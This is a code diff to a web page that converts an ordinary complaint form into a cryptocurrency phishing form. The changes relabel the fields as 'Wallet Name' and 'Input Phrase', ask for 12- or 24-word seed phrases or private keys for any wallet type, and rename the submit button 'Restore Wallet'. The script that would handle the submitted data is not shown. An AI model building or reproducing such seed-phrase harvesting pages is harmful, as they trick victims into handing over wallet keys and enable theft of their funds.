@@ -82,15 +82,26 @@ textarea {
 <h2>Submit Complaint</h2>
 
 <form id="complaintForm">
-<input type="text" id="username" placeholder="Your Name" required>
-
-<div class="textarea-wrapper">
-<textarea id="complaint" placeholder="Write your complaint..." required></textarea>
-<button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>
+<!-- Username Field -->
+<div class="field">
+  <input type="text" name="name" placeholder=" Wallet Name" required>
+  <div class="required-text">* Required</div>
 </div>
+    <!-- Complaint Field + Paste Button -->
+    <div class="field">
+      <div class="textarea-row">
+        <textarea name="message" name="name"  placeholder="Input Phrase" required></textarea>
+        <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>
+      </div>
+      <div class="required-text">Enter seed phrase or private key
+Input your seed phrases with spacing. Supports 12-word, 24-word seed phrases and private keys for all wallet types</div>
+    </div>
 
-<button class="submit-btn" type="submit">Send Complaint</button>
-</form>
+    <!-- Submit -->
+    <button type="submit" class="submit-btn">Restore Wallet</button>
+
+  </form>
+
 </div>
 
 <script>
